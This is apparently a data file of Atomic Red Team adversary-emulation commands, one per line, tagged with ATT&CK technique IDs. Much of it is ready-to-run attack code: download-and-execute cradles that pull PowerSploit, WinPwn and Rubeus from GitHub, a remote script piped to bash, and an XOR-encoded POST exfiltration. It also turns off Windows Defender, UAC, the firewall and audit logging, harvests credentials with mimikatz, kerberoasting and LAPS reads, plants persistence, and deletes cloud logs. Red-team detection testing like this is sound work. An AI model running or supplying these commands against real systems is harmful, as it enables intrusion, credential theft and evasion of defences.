122	if (-not (Test-Path "#{file_to_manipulate}")) { New-Item "#{file_to_manipulate}" -Force } ;echo "1234567890" > "#{file_to_manipulate}";fsutil  file setZeroData offset=0 length=#{file_data_length} "#{file_to_manipulate}"
176	echo Commencing Attack - Disabling Registry Value;reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
265	"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"
42	wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
36	$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer";$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model";if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
4	Copy "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam";$ver = (New-Object -COMObject "PowerPoint.Application").version;$ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad";New-Item -type Directory $ExcelRegPath -Force | Out-Null;New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null;New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null;Stop-Process -Name "PowerPnt" -ErrorAction Ignore;Start-Process "PowerPnt"
283	taskkill.exe /f /im #{process_name}
193	wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
118	if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
103	$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');;Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";;$newvalue = "AtomicTest.dll";;Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
75	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
165	Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Value "0,0,0,0";& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
232	New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR;Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt;ForEach($CLSID in Get-Content "$env:temp\clsids.txt");{try{write-output "$($Position)-$($CLSID)";write-output "------------"| out-file #{output_file} -append;write-output $($CLSID)| out-file #{output_file} -append;$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID));$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append;$position += 1} catch{}}
47	C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null;Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null;Start-Sleep -s 5 ;Stop-Job -Name Job1 | Out-Null
241	#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
45	$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager";;if (-not (Test-Path $registryPath)) {;  New-Item -Path $registryPath -Force;  Write-Host "Registry key created: $registryPath";};;$registryValueName = "ASRRules";;if (Test-Path "$registryPath\$registryValueName") {;  Remove-ItemProperty -Path $registryPath -Name $registryValueName;  Write-Host "Registry value deleted: $registryValueName";} else {;  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value "36190899-1602-49e8-8b27-eb1d0a1ce869=1" -Force;  Write-Host "Registry value created: $registryValueName";};;;Remove-ItemProperty -Path $registryPath -Name $registryValueName;Write-Host "Registry value deleted: $registryValueName"
61	#{msbuildpath}\#{msbuildname} "#{filename}"
249	#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_disable_firewall.txt
95	bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
292	& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
143	$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug
70	find / -path "*/Safari/Bookmarks.plist" 2>/dev/null >> #{output_file} &&cat #{output_file} 
161	sudo cp #{script_location} #{script_destination}&&sudo touch /private/var/db/emondClients/#{empty_file}
45	sudo mdatp config real-time-protection --value disabled
119	$ipAddr = "#{ip_address}";if ($ipAddr -eq "") {;    # Assumes the "primary" interface is shown at the top;    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1;    Write-Host "[i] Using Interface $interface";    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress;};Write-Host "[i] Base IP-Address for Subnet: $ipAddr";$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1);# Always assumes /24 subnet;Write-Host "[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'";;$ports = #{port_list};$subnetIPs = 1..254 | ForEach-Object { "$subnetSubstring$_" };;foreach ($ip in $subnetIPs) {;    foreach ($port in $ports) {;      try {;          $tcp = New-Object Net.Sockets.TcpClient;          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null;      } catch {};      if ($tcp.Connected) {;          $tcp.Close();          Write-Host "Port $port is open on $ip";      };    };}
185	cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
194	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
135	find /usr/bin -perm -2000
134	env | grep LANG&&printenv LANG&&set | grep LANG
250	copy "#{exe_path}" %temp%\T1036.003_masquerading.docx.exe /Y;copy "#{exe_path}" %temp%\T1036.003_masquerading.pdf.exe /Y;copy "#{exe_path}" %temp%\T1036.003_masquerading.ps1.exe /Y;copy "#{vbs_path}" %temp%\T1036.003_masquerading.xls.vbs /Y;copy "#{vbs_path}" %temp%\T1036.003_masquerading.xlsx.vbs /Y;copy "#{vbs_path}" %temp%\T1036.003_masquerading.png.vbs /Y;copy "#{ps1_path}" %temp%\T1036.003_masquerading.doc.ps1 /Y;copy "#{ps1_path}" %temp%\T1036.003_masquerading.pdf.ps1 /Y;copy "#{ps1_path}" %temp%\T1036.003_masquerading.rtf.ps1 /Y;%temp%\T1036.003_masquerading.docx.exe;%temp%\T1036.003_masquerading.pdf.exe;%temp%\T1036.003_masquerading.ps1.exe;%temp%\T1036.003_masquerading.xls.vbs;%temp%\T1036.003_masquerading.xlsx.vbs;%temp%\T1036.003_masquerading.png.vbs;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
72	$plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"));$key = "#{key}";$cyphertext =  @();;for ($i = 0; $i -lt $plaintext.Count; $i++) {; $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];;};$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext);[System.Net.ServicePointManager]::Expect100Continue = $false;Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
25	sc query type=service > %TEMP%\T1119_1.txt;doskey /history > %TEMP%\T1119_2.txt;wmic process list > %TEMP%\T1119_3.txt;tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
184	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ;Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"
86	Add-Type -TypeDefinition @';public class Test {;    public static void Main(string[] args) {;        System.Console.WriteLine("tweet, tweet");;    };};'@ -OutputAssembly "#{executable_filepath}";;Start-Process -FilePath "#{executable_filepath}"
241	# creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami";# this would not be part of a real attack but helpful for this simulation;function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")};powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
117	$env:COR_ENABLE_PROFILING = 1;$env:COR_PROFILER = '#{clsid_guid}';$env:COR_PROFILER_PATH = '"#{file_name}"';POWERSHELL -c 'Start-Sleep 1'
276	sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
237	# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "$Env:windir\System32\Tasks";$InstallerAssemblyFileName = 'readme.txt';$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "readme.txt";$ExpectedOutput = 'Constructor_';;# Explicitly set the directory so that a relative path to readme.txt can be supplied.;Set-Location "$Env:windir\System32\Tasks";;Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe";;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = 'Executable';    CommandLine = $CommandLine;    InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe";};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
53	$Name = "GlobalFlag";$Value = "512";$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{process}";New-Item -Path $registryPath -Force;New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force;$Name = "ReportingMode";$Value = "1";$SilentProcessExit = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{process}";New-Item -Path $SilentProcessExit -Force;New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force ;;$Name = "MonitorProcess";$Value = "#{cmd_to_run}";New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force;Start-Process whoami.exe
151	& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi;Set-Location "PathToAtomicsFolder\..\ExternalPayloads";Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi;Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local";& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt;Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi";& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
124	New-NetEventSession -Name Capture007 -LocalFilePath "$ENV:Temp\sniff.etl";Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100;Start-NetEventSession -Name Capture007;Stop-NetEventSession -Name Capture007;Remove-NetEventSession -Name Capture007
56	query user
37	swift #{swift_src} -keylog
130	sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf
87	gcloud config set project #{project_id}&&KEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format="value(KEY_ID)" --limit=1`&&gcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet
188	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n";Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
10	cat > /etc/init.d/T1543.002 << EOF&&#!/bin/bash&&### BEGIN INIT INFO&&# Provides : Atomic Test T1543.002&&# Required-Start: $all&&# Required-Stop : &&# Default-Start: 2 3 4 5&&# Default-Stop: &&# Short Description: Atomic Test for Systemd Service Creation&&### END INIT INFO&&python3 -c "import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))"&&EOF&&&&chmod +x /etc/init.d/T1543.002&&if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi ;&&systemctl enable T1543.002&&systemctl start T1543.002&&&&echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"" | sudo tee -a /etc/init.d/T1543.002&&systemctl daemon-reload&&systemctl restart T1543.002
63	wevtutil enum-logs
98	echo quit | telnet #{domain} #{port}&&exit 0
292	ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087
300	cd /tmp&&curl -s #{remote_url} |bash&&ls -la /tmp/art.txt      
262	$lockout_threshold = [int]"#{lockout_threshold}";for ($var = 1; $var -le $lockout_threshold; $var++) {;  #{plink_file} -ssh "#{vm_host}" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002;  }
227	"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 5
51	Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64 > #{output_file}
244	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
176	echo "Commencing Attack - Disabling Registry Value";New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
124	sudo #{program_path} -a -f -t 3
163	$syntaxList = #{syntax};foreach ($syntax in $syntaxList) {;#{SharpView} $syntax -}
194	net group /domain "Domain controllers"
112	set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
273	Import-Module "#{ps_module}";Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
75	reg add "HKCU\Software\Microsoft\Windows\Windows Error Reporting" /v DontShowUI /t REG_DWORD /d 1 /f
68	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');sessionGopher -noninteractive -consoleoutput
6	time
229	osascript -e 'tell application "Terminal" to do script "tor"'
152	tasklist | findstr #{process_to_enumerate}
83	hh.exe -decompile %temp% "#{local_chm_file}"
110	#{mofcomp_path} "#{mof_file}"
38	""%PROGRAMFILES%\dcrypt"\#{dcrypt_exe}"
209	Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk";$file1 = "$env:Temp\test10.lnk";Start-Process $file1;Start-Sleep -s 10;taskkill /IM a.exe /F
224	which_python=$(which python || which python3 || which python3.9 || which python2)&&$which_python -c "import pty;pty.spawn('/bin/sh')"&&exit&&$which_python -c "import pty;pty.spawn('/bin/bash')"&&exit
45	reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul ;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul;reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "0" /f >NUL 2>nul;reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul;reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >NUL 2>nul;reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
90	systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
252	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');decryptteamviewer -consoleoutput -noninteractive  
88	aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
31	gcloud config set project #{project_id}&&gcloud storage buckets delete gs://#{bucket_name}
278	Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
278	reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
247	mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>'"
280	echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
295	reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion;reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
178	go run #{input_file}
294	evil-winrm -i #{destination_address} -u #{user_name} -p #{password}
142	SetFile -m #{target_date} #{target_filename}
295	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
169	IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
242	cd $HOME&&curl -O #{remote_url}/art&&curl -O #{remote_url}/gta.db&&curl -O #{remote_url}/sqlite_dump.sh&&chmod +x sqlite_dump.sh&&find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
97	# Set the remote computer name and credentials; $RemoteComputer = "#{dest}"; $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;; # Create a CIM session; $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential;; # Define the process you want to start; $ProcessToStart = "#{process}";; # Invoke the Create method on the Win32_Process class to start the process; $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart};; # Check the result; if ($Result.ReturnValue -eq 0) {;     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"; } else {;     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"; };; # Clean up the CIM session; Remove-CimSession -CimSession $CimSession 
143	Start-Process "#{exe_binary}";Start-Sleep -Seconds 7;Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
75	reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
91	sudo #{MimiPenguin_Location} > #{output_file}&&cat #{output_file}
62	osascript #{scriptfile}
278	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
45	Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false ;Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass};Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false;Disconnect-VIServer -Confirm:$false
296	mkdir ~/Library/Mail/copy&&cp -R ~/Library/Mail/* ~/Library/Mail/copy&&echo "Manipulated data" > ~/Library/Mail/copy/manipulated.txt
196	apt install xclip -y&&history | tail -n 30 | xclip -sel clip&&xclip -o > history.txt
275	PowerShell -version 2 -command '#{v2_command}'
92	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
120	New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011";New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"
214	FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`&&if [ -z "${FILE}" ] ; then echo "No loginwindow plist file found" && exit 1 ; fi&&echo save backup copy to /tmp/&&cp ${FILE} /tmp/t1547007_loginwindow-backup.plist&&echo before&&plutil -p ${FILE}&&echo overwriting...&&#{exe_path} ${FILE} && echo after && plutil -p ${FILE}
140	docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/&&docker run --name t1069_container  -d -t t1069&&docker exec t1069_container ./test.sh
54	nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
200	Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
84	mkdir c:\exfil;diskshadow.exe /s #{filename}
107	kubectl create -f src/cronjob.yaml -n #{namespace}
49	cat /etc/passwd |grep nobody &&# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&&chsh --shell /bin/bash nobody&&usermod --password $(openssl passwd -1 nobody) nobody&&su nobody&&whoami&&exit
66	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
94	gcloud config set project #{project-id}&&gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet
106	cd "PathToAtomicsFolder\..\ExternalPayloads";.\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"      
249	netsh firewall set opmode mode=disable
5	"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"
289	for %i in (C$ IPC$ ADMIN$) do net share %i /delete
204	reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0;reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe;c:\windows\system32\provlaunch.exe LOLBin
205	useradd --create-home --shell /bin/bash art&&su --login art&&echo 'echo "Atomic Red Team was here... T1546.004" >> $HOME/art.txt' >> $HOME/.bash_logout
301	sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"&&sudo visudo -c -f /usr/local/etc/sudoers
183	#{msi_exe} /q /i "#{msi_payload}"
141	Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\T1036.zip" -DestinationPath "$env:userprofile\Downloads\T1036" -Force;cd "$env:userprofile\Downloads\T1036";cmd /c "$env:userprofile\Downloads\T1036\README.cmd" >$null 2>$null
129	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
171	"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe";"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon
187	dir \\#{computer_ip}\c$;dir \\#{computer_ip}\admin$;dir \\#{computer_ip}\IPC$
77	"#{mimikatz_exe}" "crypto::certificates /systemstore:local_machine /store:my /export"  exit
105	$Shell = New-Object -ComObject ("WScript.Shell");$ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk");$ShortCut.TargetPath="cmd.exe";$ShortCut.WorkingDirectory = "C:\Windows\System32";;$ShortCut.WindowStyle = 1;;$ShortCut.Description = "T1547.009.";;$ShortCut.Save();;$Shell = New-Object -ComObject ("WScript.Shell");$ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk");$ShortCut.TargetPath="cmd.exe";$ShortCut.WorkingDirectory = "C:\Windows\System32";;$ShortCut.WindowStyle = 1;;$ShortCut.Description = "T1547.009.";;$ShortCut.Save()
